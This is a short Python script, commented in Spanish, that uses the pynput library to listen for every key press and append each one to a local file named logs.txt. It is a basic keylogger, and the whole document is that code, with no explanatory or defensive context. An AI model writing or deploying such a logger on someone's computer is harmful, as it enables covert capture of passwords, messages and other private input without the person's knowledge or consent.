from pynput.keyboard import Key, Listener
#funcion guardar y crear txt
def on_press(key):
    try:
        with open("logs.txt", "a") as archivo:
            archivo.write(f"{key} ")
    except Exception as e:
        print(f"error al registrar: {e}")
#funcion capturar teclas
def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main() 
